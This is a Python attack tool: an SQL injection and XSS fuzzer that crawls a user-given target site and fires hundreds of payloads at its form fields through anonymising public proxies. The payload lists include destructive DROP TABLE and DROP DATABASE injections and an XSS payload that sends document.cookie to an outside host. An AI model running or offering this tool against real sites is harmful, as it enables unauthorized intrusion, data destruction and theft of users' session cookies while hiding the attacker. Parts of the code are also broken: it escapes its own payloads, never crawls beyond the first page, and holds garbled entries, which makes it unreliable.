import requests
import html
import csv
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup

sqli_payloads = [
    "' OR 'a'='a",
    "' OR '1'='1'",
    "' OR 'a'='a' --",
    "' OR '1'='1' --",
    "' OR 'a'='a' /*",
    "' OR '1'='1' /*",
    "' OR ''='",
    "' OR ''=' --",
    "' OR ''=' /*",
    "' OR 1=1",
    "' OR 1=1 --",
    "' OR 1=1 /*",
    "' OR 1=1;--",
    "' OR '1'='1';--",
    "' OR 'x'='x",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR '1'='1'#",
    "' OR 'a'='a'#",
    "' OR 1=1;#",
    "' OR 'a'='a';#",
    '" OR "1"="1',
    '" OR "a"="a',
    '" OR 1=1 --',
    '" OR 1=1 #',
    '" OR 1=1 /*',
    "' OR 1=1 AND 'x'='x",
    "' OR 1=1 AND 'x'='x' --",
    "' OR 1=1 AND 'x'='x' #",
    "' OR 1=1 AND 'x'='x' /*",
    '" OR 1=1 AND \'x\'=\'x',
    "' OR IF(NOW()=SYSDATE(), SLEEP(5), 0) OR '",
    "' OR IF(1=1, SLEEP(5), 0) OR '",
    "' OR IF(1=2, 0, SLEEP(5)) OR '",
    "' OR IF(NOW()=SYSDATE(), BENCHMARK(5000000, MD5(0)), 0) OR '",
    "' OR IF(1=1, BENCHMARK(5000000, MD5(0)), 0) OR '",
    "' OR (SELECT IF(1=1, SLEEP(5), 0)) OR '",
    "' OR (SELECT SLEEP(5) WHERE 1=1) OR '",
    "' OR IF(HEX(NOW())=HEX(SYSDATE()), SLEEP(5), 0) OR '",
    "' OR (CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END) OR '",
    "' OR 1=IF(NOW()=SYSDATE(), SLEEP(5), 0) OR '",
    "' OR (1=1 AND SLEEP(5)) OR '",
    "' OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END) OR '",
    "' UNION SELECT NULL, NULL, NULL --",
    "' UNION SELECT NULL, NULL, NULL #",
    "' UNION SELECT NULL, NULL, NULL /*",
    "' UNION SELECT 1,2,3 --",
    "' UNION SELECT 1,2,3 #",
    "' UNION SELECT 1,2,3 /*",
    "' AND 1=1",
    "' AND '1'='1",
    "' AND \"1\"=\"1",
    "' AND 1=1 --",
    "' AND 1=1 #",
    "' AND 1=1 /*",
    "' OR 1=1; DROP TABLE users; --",
    "' OR 1=1; DROP DATABASE dbname; --",
    "' UNION SELECT ALL FROM information_schema.tables --",
    "' UNION SELECT ALL FROM information_schema.columns --",
    "' OR 1=1 AND ''='",
    "' OR 1=1 AND \"\"=\"",
    "' OR 1=1 AND \"a\"=\"a",
    "' OR 1=1 AND \"\"=\"\"",
    "' AND (SELECT 1)=1",
    "' OR EXISTS(SELECT * FROM users WHERE username='admin')",
    "' OR NOT EXISTS(SELECT * FROM users WHERE username='admin')",
    "' OR EXISTS(SELECT NULL)",
    "' OR 1=1;--",
    "' OR '1'='1';--",
    "' OR 1=1 -- -",
    "' OR '1'='1' -- -",
    "' OR 1=1 -- --",
    "' OR '1'='1' -- --",
    "' AND 1=1 -- -",
    "' AND '1'='1' -- -",
    "' AND 1=1 -- --",
    "' AND '1'='1' -- --",
    "' OR 1=1 AND 1=1",
    "' OR 1=1 AND '1'='1",
    "' OR 1=1 AND \"1\"=\"1",
    "' OR 1=1 AND 'a'='a",
    "' OR 1=1 AND \"a\"=\"a",
    "' OR 'x'='x' AND 1=1",
    "' OR 'x'='x' AND '1'='1",
    "' OR 'x'='x' AND \"1\"=\"1",
    "' OR 'x'='x' AND 'a'='a",
    "' OR 'x'='x' AND \"a\"=\"a",
    "' OR 'x'='x' AND 1=1 --",
    "' OR 'x'='x' AND '1'='1 --",
    "' OR 'x'='x' AND \"1\"=\"1 --",
    "' OR 'x'='x' AND 'a'='a --",
    "' OR 'x'='x' AND \"a\"=\"a --",
    "' OR 'x'='x' AND 1=1 #",
    "' OR 'x'='x' AND '1'='1 #",
    "' OR 'x'='x' AND \"1\"=\"1 #",
    "%27 OR %27a%27=%27a",
    "%27 OR %271%27=%271%27",
    "%27 OR %27a%27=%27a%27 --",
    "%27 OR %271%27=%271%27 --",
    "%27 OR %27a%27=%27a%27 /*",
    "%27 OR %271%27=%271%27 /*",
    "%27 OR %27%27=%27",
    "%27 OR %27%27=%27 --",
    "%27 OR %27%27=%27 /*",
    "%27 OR 1=1",
    "%27 OR 1=1 --",
    "%27 OR 1=1 /*",
    "%27 OR 1=1;%3B--",
    "%27 OR %271%27=%271%27;%3B--",
    "%27 OR %27x%27=%27x",
    "%27 OR 1=1--",
    "%27 OR 1=1%23",
    "%27 OR %271%27=%271%27%23",
    "%27 OR %27a%27=%27a%23",
    "%27 OR 1=1;%23",
    "%27 OR %27a%27=%27a%3B%23",
    "%22 OR %221%22=%221",
    "%22 OR %22a%22=%22a",
    "%22 OR 1=1 --",
    "%22 OR 1=1 %23",
    "%22 OR 1=1 /*",
    "%27 OR 1=1 AND %27x%27=%27x",
    "%27 OR 1=1 AND %27x%27=%27x%27 --",
    "%27 OR 1=1 AND %27x%27=%27x%27 %23",
    "%27 OR 1=1 AND %27x%27=%27x%27 /*",
    "%22 OR 1=1 AND %27x%27=%27x",
    "%27 OR IF(NOW()=SYSDATE(), SLEEP(5), 0) OR %27",
    "%27 OR IF(1=1, SLEEP(5), 0) OR %27",
    "%27 OR IF(1=2, 0, SLEEP(5)) OR %27",
    "%27 OR IF(NOW()=SYSDATE(), BENCHMARK(5000000, MD5(0)), 0) OR %27",
    "%27 OR IF(1=1, BENCHMARK(5000000, MD5(0)), 0) OR %27",
    "%27 OR (SELECT IF(1=1, SLEEP(5), 0)) OR %27",
    "%27 OR (SELECT SLEEP(5) WHERE 1=1) OR %27",
    "%27 OR IF(HEX(NOW())=HEX(SYSDATE()), SLEEP(5), 0) OR %27",
    "%27 OR (CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END) OR %27",
    "%27 OR 1=IF(NOW()=SYSDATE(), SLEEP(5), 0) OR %27",
    "%27 OR (1=1 AND SLEEP(5)) OR %27",
    "%27 OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END) OR %27",
    "%27 UNION SELECT NULL, NULL --",
    "%27 UNION SELECT NULL, NULL, NULL %23",
    "%27 UNION SELECT NULL, NULL, NULL /*",
    "%27 UNION SELECT 1,2,3 --",
    "%27 UNION SELECT 1,2,3 %23",
    "%27 UNION SELECT 1,2,3 /*",
    "%27 AND 1=1",
    "%27 AND %271%27=%271",
    "%27 AND %221%22=%221",
    "%27 AND 1=1 --",
    "%27 AND 1=1 %23",
    "%27 AND 1=1 /*",
    "%27 OR 1=1;%3B DROP TABLE users;%3B--",
    "%27 OR 1=1;%3B DROP DATABASE dbname;%3B--",
    "%27 UNION SELECT ALL FROM information_schema.tables --",
    "%27 UNION SELECT ALL FROM information_schema.columns --",
    "%27 OR 1=1 AND %27%27=%27",
    "%27 OR 1=1 AND %22%22=%22",
    "%27 OR 1=1 AND %22a%22=%22a",
    "%27 OR 1=1 AND %22%22=%22%22",
    "%27 AND (SELECT 1)=1",
    "%27 OR EXISTS(SELECT * FROM users WHERE username=%27admin%27)",
    "%27 OR NOT EXISTS(SELECT * FROM users WHERE username=%27admin%27)",
    "%27 OR EXISTS(SELECT NULL)",
    "%27 OR 1=1;%3B--",
    "%27 OR %271%27=%271;%3B--",
    "%27 OR 1=1 -- -",
    "%27 OR %271%27=%271 -- -",
    "%27 OR 1=1 -- --",
    "%27 OR %271%27=%271 -- --",
    "%27 AND 1=1 -- -",
    "%27 AND %271%27=%271 -- -",
    "%27 AND 1=1 -- --",
    "%27 AND %271%27=%271 -- --",
    "%27 OR 1=1 AND 1=1",
    "%27 OR 1=1 AND %271%27=%271",
    "%27 OR 1=1 AND %221%22=%221",
    "%27 OR 1=1 AND %27a%27=%27a",
    "%27 OR 1=1 AND %22a%22=%22a",
    "%27 OR %27x%27=%27x AND 1=1",
    "%27 OR %27x%27=%27x AND %271%27=%271",
    "%27 OR %27x%27=%27x AND %221%22=%221",
    "%27 OR %27x%27=%27x AND %27a%27=%27a",
    "%27 OR %27x%27=%27x AND %22a%22=%22a",
    "%27 OR %27x%27=%27x AND 1=1 --",
    "%27 OR %27x%27=%27x AND %271%27=%271 --",
    "%27 OR %27x%27=%27x AND %221%22=%221 --",
    "%27 OR %27x%27=%27x AND %27a%27=%27a --",
    "%27 OR %27x%27=%27x AND %22a%22=%22a --",
    "%27 OR %27x%27=%27x AND 1=1 %23",
    "%27 OR %27x%27=%27x AND %271%27=%271 %23",
    "%27 OR %27x%27=%27x AND %221%22=%221 %23",
    "%27 OR 1=1%25%2727",
    "%27 OR 1=1%25%27 --",
    "%27 OR 1=1%25%27 %23",
    "%27 OR 1=1%25%27 /*",
    "%27 OR %27a%27=%27a%25%27",
    "%27 OR %27x%27=%27x%25%27",
    "%27 OR %27a%27=%27a%25%27 --",
    "%27 OR %27x%27=%27x%25%27 --",
    "%27 OR %27a%27=%27a%25%27 %23",
    "%27 OR %27x%27=%27x%25%27 %23",
    "%27 OR %27a%27=%27a%25%27 /*",
    "%27 OR %27x%27=%27x%25%27 /*",
    "%27 OR %27%27=%25%27%27",
    "%27 OR %27%27=%25%27%27 --",
    "%27 OR %27%27=%25%27%27 %23",
    "%27 OR %27%27=%25%27%27 /*",
    "%27 OR 1=1 AND %27%27=%25%27%27",
    "%27 OR 1=1 AND %22%22=%25%22%22",
    "%27 OR 1=1 AND %22a%22=%25%22a%22",
    "%27 OR 1=1 AND %22%22=%25%22%22",
    "%27 AND (SELECT 1)=1%25%27",
    "%27 OR EXISTS(SELECT * FROM users WHERE username=%25%27admin%25%27)",
    "%27 OR NOT EXISTS(SELECT * FROM users WHERE username=%25%27admin%25%27)",
    "%27 OR EXISTS(SELECT NULL%25%27)",
    "%27 OR 1=1%3B%25%27--",
    "%27 OR %271%27=%271%3B%25%27--",
    "%27 OR 1=1 -- %25%27-",
    "%27 OR %271%27=%271 -- %25%27-",
    "%27 OR 1=1 -- %25%27--",
    "%27 OR %271%27=%271 -- %25%27--",
    "%27 AND 1=1 -- %25%27-",
    "%27 AND %271%27=%271 -- %25%27-",
    "%27 AND 1=1 -- %25%27--",
    "%27 AND %271%27=%271 -- %25%27--",
    "%27 OR 1=1 AND 1=1%25%27",
    "%27 OR 1=1 AND %271%27=%271%25%27",
    "%27 OR 1=1 AND %221%22=%221%25%27",
    "%27 OR 1=1 AND %27a%27=%27a%25%27",
    "%27 OR 1=1 AND %22a%22=%22a%25%27",
    "%27 OR %27x%27=%27x AND 1=1%25%27",
    "%27 OR %27x%27=%27x AND %271%27=%271%25%27",
    "%27 OR %27x%27=%27x AND %221%22=%221%25%27",
    "%27 OR %27x%27=%27x AND %27a%27=%27a%25%27",
    "%27 OR %27x%27=%27x AND %22a%22=%22a%25%27",
    "%27 OR %27x%27=%27x AND 1=1 -- %25%27",
    "%27 OR %27x%27=%27x AND %271%27=%271 -- %25%27",
    "%27 OR %27x%27=%27x AND %221%22=%221 -- %25%27",
    "%27 OR %27x%27=%27x AND %27a%27=%27a -- %25%27",
    "%27 OR %27x%27=%27x AND %22a%22=%22a -- %25%27",
    "%27 OR %27x%27=%27x AND 1=1 %23%25%27",
    "%27 OR %27x%27=%27x AND %271%27=%271 %23%25%27",
    "%27 OR %27x%27=%27x AND %221%22=%221 %23%25%27"
]


xss_payloads = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    '\'><script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    '\'><img src=x onerror=alert(1)>',
    '"><svg onload=alert(1)>',
    '\'><svg onload=alert(1)>',
    '"><body onload=alert(1)>',
    '\'><body onload=alert(1)>',
    '<iframe src="javascript:alert(1)"></iframe>',
    '<link rel="stylesheet" href="javascript:alert(1)">',
    '<style>@import "javascript:alert(1)";</style>',
    '<form action="javascript:alert(1)"><input type=submit></form>',
    '<input type="image" src="javascript:alert(1)">',
    '<a href="javascript:alert(1)">Click me</a>',
    '<a href="#" onclick="alert(1)">Click me</a>',
    '<object data="javascript:alert(1)"></object>',
    '<embed src="javascript:alert(1)">',
    '<bgsound src="javascript:alert(1)">',
    '<marquee onstart=alert(1)>',
    '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
    '<video src="javascript:alert(1)"></video>',
    '<audio src="javascript:alert(1)"></audio>',
    '<isindex action="javascript:alert(1)">',
    '<details open ontoggle="alert(1)">',
    '<plaintext><script>alert(1)</script>',
    '<xmp><script>alert(1)</script>',
    '<math><maction xlink:href="javascript:alert(1)">XSS</maction></math>',
    '<script src="data:text/javascript,alert(1)"></script>',
    '"><script src="data:text/javascript,alert(1)"></script>',
    '\'><script src="data:text/javascript,alert(1)"></script>',
    '<script>document.write("<img src=x onerror=alert(1)>")</script>',
    '"><script>document.write("<img src=x onerror=alert(1)>")</script>',
    '\'><script>document.write("<img src=x onerror=alert(1)>")</script>',
    "<style>@keyframes a{}b{animation:a;}</style><b/onanimationstart=prompt`${document.domain}&#x60;>",
    "<marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'>",
    "<svg><circle><set onbegin=prompt(1) attributename=fill>",
    "<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>",
    "\"%3balert`1`%3b\"",
    "asd\"`> onpointerenter=x=prompt,x`XSS`",
    "<x onauxclick=import('//1152848220/')>click",
    "<x onauxclick=a=alert,a(domain)>click -@niksthehacker",
    "<x onauxclick=import('//1152848220/')>click",
    "<x onauxclick=import('//xss/')>click",
    "\\\"<>onauxclick<>=(eval)(atob(`YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==`))>+<sss",
    "{{constructor.constructor(alert`1`)()}}",
    "javascript:new%20Function`al\ert\`1\``;",
    "\"><a/\test=\"%26quot;x%26quot;\"href='%01javascript:/*%b1*/;location.assign(\"//hackerone.com/stealthy?x=\"+location)'>Click -@stealthybugs",
    "<iframe/onload='this[\"src\"]=\"javas&Tab;cript:al\"+\"ert``\"';>",
    "<iframe/onload=\"var b = 'document.domain)'; var a = 'JaV' + 'ascRipt:al' + 'ert(' + b; this['src']=a\">",
    "<audio autoplay onloadstart=this.src='hxxps://msf.fun/?c='+document[\"cook\"+\"ie\"]' src=x>",
    "<img/src=q onerror='new Function`al\ert\`1\``'>",
    "<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>",
    "<svg onload\r\n=$.globalEval(\"al\"+\"ert()\");>",
    "[1].map(alert)   or    (alert)(1)",
    "<\"><details/open/ontoggle=\"jAvAsCrIpT&colon;alert&lpar;/xss-by-tarun/&rpar;\">XXXXX</a>",
    "[1].find(confirm)",
    "<svg/onload=self[`aler`%2b`t`]`1`>",
    "%22%3E%3Cobject%20data=data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==%3E%3C/object%3E",
    "'-[document.domain].map(alert)-'",
    "ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6 -@naglinagli",
    "<meter onmouseover=\"alert(1)\" -@manjith27945363",
    "'\">><div><meter onmouseover=\"alert(1)\"</div>\" -@manjith27945363",
    ">><marquee loop=1 width=0 onfinish=alert(1)> -@manjith27945363",
    "Wordfence 7.4.2",
    "<a href=&#01javascript:alert(1)> -@brutelogic",
    "<a/href=%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x0a;:alert(1)>please%20click%20here</a>",
    "<a\"/onclick=(confirm)()>Click Here!",
    "Dec: <svg onload=prompt%26%230000000040document.domain)>",
    "Hex: <svg onload=prompt%26%23x000000028;document.domain)>",
    "xss'\"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>",
    "<a href=\"j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;\">X</a>",
    "<--%253cimg%20onerror=alert(1)%20src=a%253e --!>",
    "<a+HREF='%26%237javascrip%26%239t:alert%26lpar;document.domain)'>",
    "javascript:{ alert`0` }",
    "1'\"><img/src/onerror=.1|alert``>",
    "<img src=x onError=import('//1152848220/')>",
    "%2sscript%2ualert()%2s/script%2u",
    "<svg on onload=(alert)(document.domain)>",
    "<img ignored=() src=x onerror=prompt(1)>",
    "<svg onx=() onload=(confirm)(1)>",
    "“><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;",
    "<svg on =i onload=alert(domain) (working)",
    "<svg onx=() onload=window.alert?.()> (working)",
    "test\",prompt%0A/*HelloWorld*/(document.domain) (working)- @Brutelogic",
    "\"onx+%00+onpointerenter%3dalert(domain)+x\" (working)- @Brutelogic",
    "\"><svg%20onload=alert%26%230000000040\"1\")> (working)- @IamRenganathan",
    "%27%09);%0d%0a%09%09[1].find(alert)//",
    "\"><img src=1 onmouseleave=print()> - @itsgeekymonk",
    "<svg on onload=(alert)(document.domain)> -@zapstiko",
    "<svg/on%20onload=alert(1)> (working) -@aufzayed",
    "<img/src=x onError=\"`${x}`;alert(`Ex.Mi`);\"> -@ex_mi",
    "\">%0D%0A%0D%0A<x '=\"foo\"><x foo='><img src=x onerror=javascript:alert(`cloudfrontbypass`)//'>",
    "\">'><details/open/ontoggle=confirm('XSS')>",
    "6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/",
    "&quot;&gt;&lt;img src=x onerror=confirm(1);&gt;",
    "<x/onclick=globalThis&lsqb;'\u0070r\u006f'+'mpt']&lt;)>clickme   (working)-Pinaki @0xInfection(Make sure to URL encode the payload properly)",
    "tarun\"><x/onafterscriptexecute=confirm%26lpar;)// -@sratarun",
    "<a/href=\"j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)\" />click (workin)Pinaki @0xInfection (Make sure the applications decodes the payload from encoded)",
    "<details/open/ontoggle=\"self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];\"> - @xsspayloads",
    "<svg onload\r\n=$.globalEval(\"al\"+\"ert()\");>",
    "<bleh/onclick=top[/al/.source+/ert/.source]&Tab;``>click Pinaki @0xInfection",
    "<sVg OnPointerEnter=\"location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//</div\"> -@AldenAous",
    "<a/href=\"j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='test'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)\" />tap",
    "<img src='x' onerror=alert(1)>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>",
    "<script>eval('ale' + 'rt(1)')</script>",
    "<img src=x onerror=Function('al'+'ert(1)')()>",
    "<svg onload=Function('aler'+'t(1)')()>",
    "<img src='x' onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<img src=x onerror=alert(String.fromCharCode(49))>",
    "<img src='x' onerror='alert(\"1\")'>",
    "<svg onload=\"alert('1')\">",
    "<script>document.write('<img src=x onerror=alert(1)>');</script>",
    "<script>document.write('<svg/onload=alert(1)>');</script>",
    "<script>document.write('<iframe src=javascript:alert(1)>');</script>",
    "<img src=x onmousedown=\"alert('1')\">",
    "<svg onmousedown=\"alert('1')\">",
    "<iframe src=javascript:alert(1) onmousedown=\"alert('1')\">",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<img src=x onerror=alert`1`>",
    "<svg onload=alert`1`>",
    "<iframe src=javascript:alert`1`>",
    "<img src=x onerror=alert`1`>",
    "<svg onload=alert`1`>",
    "<iframe src=javascript:alert`1`>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<img src=x%09onerror%09=%09alert(1)>",
    "<svg%09onload%09=%09alert(1)>",
    "<iframe%09src=javascript:alert(1)>",
    "<a href=\"mailto:test@example.com\" onmouseover=alert(1)>",
    "<a href=\"mailto:test@example.com\" onmousemove=alert(1)>",
    "<a href=\"mailto:test@example.com\" onmouseout=alert(1)>",
    "<img src=x onerror=window >",
    "<svg onload=window >",
    "<iframe src=javascript:window >",
    "<img src=x onerror=alert(document['coo'+'kie'])>",
    "<svg onload=alert(document['coo'+'kie'])>",
    "<iframe src=javascript:alert(document['coo'+'kie'])>",
    "<img src=x onerror=alert(String('1'))>",
    "<svg onload=alert(String('1'))>",
    "<iframe src=javascript:alert(String('1'))>",
    "<img src=x onerror=location='javascript:alert(1)'>",
    "<svg onload=location='javascript:alert(1)'>",
    "<iframe src=javascript:location='javascript:alert(1)'>",
    "<img src=x onerror=eval('alert(1)')>",
    "<svg onload=eval('alert(1)')>",
    "<iframe src=javascript:eval('alert(1)')>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "＜img src=x onerror=alert(1)＞",
    "＜svg onload=alert(1)＞",
    "＜iframe src=javascript:alert(1)＞",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<img src=&quot;x&quot; onerror=&quot;alert(1)&quot;>",
    "<svg onload=&quot;alert(1)&quot;>",
    "<iframe src=&quot;javascript:alert(1)&quot;>",
    "＜ｉｍｇ ｓｒｃ＝ｘ ｏｎｅｒｒｏｒ＝ａｌｅｒｔ（１）＞",
    "＜ｓｖｇ ｏｎｌｏａｄ＝ａｌｅｒｔ（１）＞",
    "＜ｉｆｒａｍｅ ｓｒｃ＝ｊａｖａｓｃｒｉｐｔ：ａｌｅｒｔ（１）＞",
    "<img src=x onerror=(()=>alert(1))()>",
    "<svg onload=(()=>alert(1))()>",
    "<iframe src=javascript:(()=>alert(1))()>",
    "<img src=x onerror=\\141\\154\\145\\162\\164\\50\\61\\51>",
    "<svg onload=\\141\\154\\145\\162\\164\\50\\61\\51>",
    "<iframe src=javascript:\\141\\154\\145\\162\\164\\50\\61\\51>",
    "<img src=x onerror=\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029>",
    "<svg onload=\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029>",
    "<iframe src=javascript:\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029>",
    "+ADw-script+AD4-alert(1)+ADw-/script+AD4-",
    "+ADw-iframe src=javascript:alert(1)+ADw-/iframe+AD4-",
    "+ADw-img src=x onerror=alert(1)+AD4-",
    "\x3cimg src=x onerror=alert(1)\x3e",
    "\x3csvg onload=alert(1)\x3e",
    "\x3ciframe src=javascript:alert(1)\x3e",
    "\x00\x65\x00\x72\x00\x74\x00\x28\x00\x31\x00\x29\x00\x3e",
    "\x00\x3c\x00\x73\x00\x76\x00\x67\x00\x20\x00\x6f\x00\x6e\x00\x6c\x00\x6f\x00\x61\x00\x64\x00\x3d\x00\x61\x00\x6c\x00\x65\x00\x72\x00\x74\x00\x28\x00\x31\x00\x29\x00\x3e",
    "\x00\x3c\x00\x69\x00\x66\x00\x72\x00\x61\x00\x6d\x00\x65\x00\x20\x00\x73\x00\x72\x00\x63\x00\x3d\x00\x6a\x00\x61\x00\x76\x00\x61\x00\x73\x00\x63\x00\x72\x00\x69\x00\x70\x00\x74\x00\x3a\x00\x61\x00\x6c\x00\x65\x00\x72\x00\x74\x00\x28\x00\x31\x00\x29\x00\x3e",
    "\x00\x00\x00\x3c\x00\x00\x00\x69\x00\x00\x00\x6d\x00\x00\x00\x67\x00\x00\x00\x20\x00\x00\x00\x73\x00\x00\x00\x72\x00\x00\x00\x63\x00\x00\x00\x3d\x00\x00\x00\x78\x00\x00\x00\x20\x00\x00\x00\x6f\x00\x00\x00\x6e\x00\x00\x00\x65\x00\x00\x00\x72\x00\x00\x00\x72\x00\x00\x00\x6f\x00\x00\x00\x72\x00\x00\x00\x3d\x00\x00\x00\x61\x00\x00\x00\x6c\x00\x00\x00\x65\x00\x00\x00\x72\x00\x00\x00\x74\x00\x00\x00\x28\x00\x00\x00\x31\x00\x00\x00\x29\x00\x00\x00\x3e",
    "\x00\x00\x00\x3c\x00\x00\x00\x73\x00\x00\x00\x76\x00\x00\x00\x67\x00\x00\x00\x20\x00\x00\x00\x6f\x00\x00\x00\x6e\x00\x00\x00\x6c\x00\x00\x00\x6f\x00\x00\x00\x61\x00\x00\x00\x64\x00\x00\x00\x3d\x00\x00\x00\x61\x00\x00\x00\x6c\x00\x00\x00\x65\x00\x00\x00\x72\x00\x00\x00\x74\x00\x00\x00\x28\x00\x00\x00\x31\x00\x00\x00\x29\x00\x00\x00\x3e",
    "\x00\x00\x00\x3c\x00\x00\x00\x69\x00\x00\x00\x66\x00\x00\x00\x72\x00\x00\x00\x61\x00\x00\x00\x6d\x00\x00\x00\x65\x00\x00\x00\x20\x00\x00\x00\x73\x00\x00\x00\x72\x00\x00\x00\x63\x00\x00\x00\x3d\x00\x00\x00\x6a\x00\x00\x00\x61\x00\x00\x00\x76\x00\x00\x00\x61\x00\x00\x00\x73\x00\x00\x00\x63\x00\x00\x00\x72\x00\x00\x00\x69\x00\x00\x00\x70\x00\x00\x00\x74\x00\x00\x00\x3a\x00\x00\x00\x61\x00\x00\x00\x6c\x00\x00\x00\x65\x00\x00\x00\x72\x00\x00\x00\x74\x00\x00\x00\x28\x00\x00\x00\x31\x00\x00\x00\x29\x00\x00\x00\x3e",
    "\uFEFF<script>alert(1)</script>",
    "\uFEFF<img src=x onerror=alert(1)>",
    "\uFEFF<svg onload=alert(1)>"
]

def get_proxies():
    url = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all&simplified=true"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            proxies = response.text.split('\r\n')
            return proxies
        else:
            print(f"Failed to fetch proxies. Status code: {response.status_code}")
            return None
    except requests.exceptions.RequestException as e:
        print(f"Exception occurred: {str(e)}")
        return None

def make_request(url, proxy):
    try:
        response = requests.get(url, proxies={"http": proxy, "https": proxy}, timeout=10)
        if response.status_code == 200:
            return response
        else:
            print(f"Request failed with status code: {response.status_code}")
            return None
    except requests.exceptions.RequestException as e:
        print(f"Exception occurred: {str(e)}")
        return None

def sqli_fuzzer(url, param, payloads, csv_writer, proxies):
    for payload in payloads:
        for proxy in proxies:
            test_url = f"{url}?{param}={html.escape(payload)}"
            response = make_request(test_url, proxy)
            if response:
                if "SQL syntax" in response.text or response.status_code == 500 or response.elapsed.total_seconds() >= 5:
                    csv_writer.writerow([url, param, payload, "SQL Injection using Proxy: " + proxy])
                    break

def xss_fuzzer(url, param, payloads, csv_writer, proxies):
    for payload in payloads:
        for proxy in proxies:
            test_url = f"{url}?{param}={html.escape(payload)}"
            response = make_request(test_url, proxy)
            if response:
                if payload in response.text:
                    csv_writer.writerow([url, param, payload, "XSS using Proxy: " + proxy])
                    break

def web_crawler(url, proxies):
    discovered_urls = set()
    discovered_urls.add(url)
    internal_urls = set()
    external_urls = set()
    while discovered_urls:
        current_url = discovered_urls.pop()
        try:
            response = make_request(current_url, proxies[0])
            if response:
                soup = BeautifulSoup(response.text, "html.parser")
                for a_tag in soup.find_all("a", href=True):
                    href = a_tag["href"]
                    parsed_href = urlparse(href)
                    if parsed_href.netloc == "":
                        internal_urls.add(urljoin(current_url, href))
                    else:
                        external_urls.add(href)
                for form in soup.find_all("form"):
                    action = form.get("action")
                    if action:
                        for input_tag in form.find_all("input"):
                            param = input_tag.get("name")
                            if param:
                                with open('vulnerabilities.csv', 'a', newline='') as csvfile:
                                    csv_writer = csv.writer(csvfile)
                                    sqli_fuzzer(current_url, param, sqli_payloads, csv_writer, proxies)
                                    xss_fuzzer(current_url, param, xss_payloads, csv_writer, proxies)
        except requests.RequestException as e:
            print(f"Error scanning {current_url}, Error: {e}")

def main():
    target_url = input("Target URL: ")
    proxies = get_proxies()
    if not proxies:
        print("Failed to fetch proxies. Exiting...")
        return
    with open('vulnerabilities.csv', 'w', newline='') as csvfile:
        csv_writer = csv.writer(csvfile)
        csv_writer.writerow(["URL", "Parameter", "Payload", "Vulnerability"])
        web_crawler(target_url, proxies)

if __name__ == "__main__":
    main()
